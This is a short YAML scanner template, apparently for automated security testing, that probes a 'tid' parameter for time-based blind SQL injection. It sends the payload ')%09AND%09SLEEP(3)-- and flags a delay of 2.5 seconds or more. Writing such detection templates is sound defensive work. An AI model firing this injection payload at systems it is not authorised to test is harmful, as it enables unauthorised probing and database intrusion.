id: sqli-time3-240
name: 'Delay probe in tid'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via tid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      tid:
        - ''')%09AND%09SLEEP(3)--'
    matchers:
      - type: time
        ms: 2500
